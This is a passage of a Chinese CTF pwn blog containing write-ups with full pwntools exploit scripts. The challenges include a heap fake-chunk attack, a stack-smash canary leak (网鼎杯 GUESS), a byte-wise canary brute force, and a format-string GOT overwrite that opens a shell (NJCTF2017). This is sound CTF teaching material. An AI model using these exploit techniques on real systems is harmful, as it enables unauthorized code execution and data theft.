class="number">0x60203d</span>)</span><br><span class="line">change(<span class="number">2</span>,payload)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'c'</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">5</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate fake chunk</span></span><br><span class="line"><span class="comment"># fake chunk size is 0x101, not in fastbin </span></span><br><span class="line">payload = <span class="string">'\x01\x01'</span>+<span class="string">'\x00'</span>*<span class="number">5</span></span><br><span class="line">chunk_base = <span class="number">0x602070</span></span><br><span class="line">write(chunk_base+<span class="number">0x8</span>,payload)</span><br><span class="line"><span class="comment"># 虚假chunk的下一个chunk的prev_size</span></span><br><span class="line">write(chunk_base+<span class="number">0x100</span>,p64(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment"># 虚假chunk的下一个chunk的size</span></span><br><span class="line">write(chunk_base+<span class="number">0x100</span>+<span class="number">0x8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="comment"># 虚假chunk的下下个chunk的size</span></span><br><span class="line">write(chunk_base+<span class="number">0x100</span>+<span class="number">0x20</span>+<span class="number">0x8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x602080</span>,p64(chunk_base+<span class="number">0x10</span>)[:<span class="number">-1</span>])</span><br><span class="line"><span class="comment"># change free_times to 0</span></span><br><span class="line">write(<span class="number">0x602098</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(<span class="number">0x602068</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x400c6e</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line">release(<span class="number">4</span>)</span><br><span class="line">new_write(<span class="number">0x602080</span>,<span class="string">''</span>)</span><br><span class="line">change(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(<span class="number">0x4008e3</span>)[:<span class="number">-1</span>])</span><br><span class="line">new_write(<span class="number">0x602070</span>,p64(<span class="number">0x0</span>))</span><br><span class="line">new(<span class="number">2</span>,<span class="string">'aaa'</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/wangdingbei/网鼎杯-guess/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/30/wangdingbei/网鼎杯-guess/" itemprop="url">网鼎杯-GUESS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T23:33:26+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="网鼎杯-guess"><a href="#网鼎杯-guess" class="headerlink" title="网鼎杯-guess"></a>网鼎杯-guess</h1><p>题目链接如下：</p>
+<p>链接：<a href="https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ" target="_blank" rel="noopener">https://pan.baidu.com/s/19Imm-V-i71vpEN1mofwOhQ</a> 密码：isek</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序的主要代码如下：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-29/7310216.jpg" alt=""></p>
+<p>程序首先打开flag.txt将flag读取到了栈中，接着进入循环，每次循环会fork出一个进程，该进程会读取用户输入的flag，并将该flag与存在栈中的标准flag进行比较。并且对fork的次数进行了限制，最多只能fork三次，也就是只有三次‘猜’flag的机会。</p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>程序在读取输入的时候存在溢出，没有对输入的内容长度进行限制，但是这里开启了Cannary，所以不能简单的控制程序的执行流程。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里开启了Cannary，为了绕过它的保护，可以通过爆破或者泄露的方式，但是这里对fork的次数进行了限制，所以爆破的方法不行。</p>
+<p>采用stack smash来进行信息泄露，stack smash的原理在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#stack-smash" target="_blank" rel="noopener">CTF Wiki</a>中有介绍。大概原理就是在Cannary被覆盖之后程序会检测到错误，这时会执行<code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而argv[0]指针是保存在栈上的，默认指向的是程序的名称，通过覆盖该指针为我们想要泄露的地址达到信息泄漏的目的。</p>
+<p>程序只能泄露三次，可以按照如下顺序泄露：首先通过got表来泄露libc的基址，接着利用libc中的environ变量来泄露栈的基址，最后通过固定的偏移来泄露栈上存放的flag</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./GUESS'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./GUESS'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'This is GUESS FLAG CHALLENGE!'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># set follow-fork-mod child</span></span><br><span class="line"><span class="comment"># b *0x400b28</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># print p.recvuntil('Please type your guessing flag')</span></span><br><span class="line"><span class="comment"># raw_input('aaa')</span></span><br><span class="line"><span class="comment"># p.sendline('a'*0x30)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line"><span class="comment"># here is offset to argv[0]</span></span><br><span class="line">offset = <span class="number">0x40</span>+<span class="number">0x8</span>*<span class="number">3</span>+(<span class="number">0x7fff42181a88</span><span class="number">-0x7fff421819b8</span>)</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(<span class="number">0x602048</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line"><span class="comment"># 0x7fb8571c1740</span></span><br><span class="line">libc_start_main = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = libc_start_main-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment"># using environ to leak stack base addr</span></span><br><span class="line">stack_base_ptr = libc_base+libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(stack_base_ptr)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(stack_base_ptr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*** stack smashing detected ***: '</span>)</span><br><span class="line"><span class="comment"># 0x7fb8571c1740</span></span><br><span class="line">stack_base = u64(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_base:'</span>+hex(stack_base)</span><br><span class="line"><span class="comment"># calc flag addr by stack_base-flag_offset</span></span><br><span class="line">flag_offset = <span class="number">0x7ffc67b40248</span><span class="number">-0x7ffc67b400e0</span></span><br><span class="line">flag_addr = stack_base - flag_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*offset+p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/30/NJCTF2017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/30/NJCTF2017/" itemprop="url">NJCTF2017</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-30T23:02:22+08:00">
+                2018-09-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="NJCTF2017"><a href="#NJCTF2017" class="headerlink" title="NJCTF2017"></a>NJCTF2017</h1><p>题目链接如下：</p>
+<p>链接：<a href="https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w" target="_blank" rel="noopener">https://pan.baidu.com/s/1U2214K0IklnTXEQUV9XG1w</a><br>密码：mxwj</p>
+<h2 id="pwn-messager"><a href="#pwn-messager" class="headerlink" title="pwn-messager"></a>pwn-messager</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序采用的是socket监听端口的方式来接受用户请求，每接收到一个请求都会fork一个子进程，子进程会调用函数<code>sub_400be9</code>：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-30/13492810.jpg" alt=""></p>
+<p>函数sub_400be9中存在明显的溢出：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-30/94521251.jpg" alt=""></p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>查看程序开启了哪些保护，开启了Cannary和NX：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@0a07932a245e:/home/em/ctf/njctf/messager# checksec messager </span><br><span class="line">[*] &apos;/home/em/ctf/njctf/messager/messager&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>开启了Canary，要利用这个栈溢出就需要知道Canary的值，Canary的值要么通过泄露、要么通过爆破的方式来获取，这里可以通过爆破的方式。因为fork出的子进程的栈数据和父进程是一致的，所以每次fork的进程中Canary的值都是一样的，只需要逐字节的爆破即可得到正确的Canary。</p>
+<p>得到Canary的值后就能够控制程序的执行流程了，由于开启了NX，只能通过ROP的方式，程序的0x400bc6处将读取到的flag发送出去：<br><img src="http://oslgqkd4w.bkt.clouddn.com/18-9-30/90692350.jpg" alt=""><br>只需要控制程序流程让其执行该函数即可。</p>
+<h3 id="过程记录"><a href="#过程记录" class="headerlink" title="过程记录"></a>过程记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一次调试，canary的值：</span><br><span class="line"> RAX  0x62e3d26fa6bada00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f7fd9fd8207 (alarm+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x3</span><br><span class="line"></span><br><span class="line">第二次调试，canary的值：</span><br><span class="line"> RAX  0x62e3d26fa6bada00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f7fd9fd8207 (alarm+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x3</span><br></pre></td></tr></table></figure>
+<p>从调试过程中发现cannry的值一直没有发生变化，因为canary的值是从内存中的某个地址取出来的，而子进程是通过fork的方式来产生的，因此canary的值始终是相等的，这就导致可以逐字节的覆盖canary的值，通过判定程序有没有崩溃来确定覆盖的字节值是否是正确的。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof('messager')[0])</span></span><br><span class="line">canary=<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_canary</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> canary</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">			p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">5555</span>)</span><br><span class="line">			temp = chr(j)</span><br><span class="line">			p.recvuntil(<span class="string">'Welcome!\n'</span>)</span><br><span class="line">			payload = <span class="string">'a'</span>*<span class="number">0x68</span>+canary+temp</span><br><span class="line">			p.send(payload)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				data = p.recvline()</span><br><span class="line">				<span class="comment">#print data</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">"Message received"</span> <span class="keyword">in</span> data:</span><br><span class="line">					canary += temp</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'canary = '</span> + canary.encode(<span class="string">'hex'</span>)</span><br><span class="line">				<span class="comment"># print 'ok'</span></span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">canary = p64(<span class="number">0x62e3d26fa6bada00</span>)</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>,<span class="number">5555</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome!\n'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400fb3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400fb1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop_chain = 'a'*0x68+canary+p64(0xdeadbeef)+p64(pop_rdi)+p64(0x5)+p64(pop_rsi_r15)+p64(0x602160)+p64(0x0)+p64(0x400950)</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x68</span>+canary+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x400bc6</span>)</span><br><span class="line"><span class="comment"># p.send(rop_chain)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="pwn-pingme"><a href="#pwn-pingme" class="headerlink" title="pwn-pingme"></a>pwn-pingme</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>非常明显的格式化字符串漏洞，限制了输入字符的长度为64字节，但是这已经足够了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+Ch] [bp-4Ch]@2</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  sub_80485D7();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ping me"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_804858B(&amp;format, <span class="number">64</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">";( "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>格式化字符串的利用，首先通过格式化字符串来泄露libc基址，接着使用格式化字符串往任意地址写数据的功能来修改got表，拿到shell。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pingme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pingme'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span><span class="params">(addr,value,offset)</span>:</span></span><br><span class="line">	position_1 = value&amp;<span class="number">0xFFFF</span></span><br><span class="line">	position_2 = (value&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xFFFF</span></span><br><span class="line">	<span class="keyword">if</span> position_2&gt;position_1:</span><br><span class="line">		payload=p32(addr)+p32(addr+<span class="number">2</span>)+<span class="string">'%'</span>+str(position_1<span class="number">-4</span><span class="number">-4</span>)+<span class="string">'x%'</span>+str(offset)+<span class="string">'$hn'</span>+<span class="string">'%'</span>+str(position_2-position_1)+<span class="string">'x%'</span>+str(offset+<span class="number">1</span>)+<span class="string">'$hn'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		payload=p32(addr+<span class="number">2</span>)+p32(addr)+<span class="string">'%'</span>+str(position_2<span class="number">-4</span><span class="number">-4</span>)+<span class="string">'x%'</span>+str(offset)+<span class="string">'$hn'</span>+<span class="string">'%'</span>+str(position_1-position_2)+<span class="string">'x%'</span>+str(offset+<span class="number">1</span>)+<span class="string">'$hn'</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'Ping me'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x8048663</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># info leak</span></span><br><span class="line">payload = p32(elf.got[<span class="string">'printf'</span>])+<span class="string">'%7$s'</span>+<span class="string">'a'</span>*<span class="number">10</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(p32(elf.got[<span class="string">'printf'</span>]))</span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(printf_addr)</span><br><span class="line">libc_base = printf_addr-libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite got</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">payload = overwrite(printf_got,system_addr,<span class="number">7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="233"><a href="#233" class="headerlink" title="233"></a>233</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>使用IDA查看发现程序没有任何输出，main函数里面存在明显的栈溢出：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [sp+16h] [bp-Eh]@1</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>查看程序开启的保护措施：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
+<p>程序开启了PIE，但是又没有信息泄露的地方，这种情况下采用爆破的方式，因为程序是32位的，爆破起来难度不大：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一次调试，libc基址：</span><br><span class="line">0xF7D9E000</span><br><span class="line"></span><br><span class="line">第二次调试，libc基址：</span><br><span class="line">0xF7D9B000</span><br><span class="line"></span><br><span class="line">第三次调试，libc基址：</span><br><span class="line">0xF7D45000</span><br></pre></td></tr></table></figure></p>
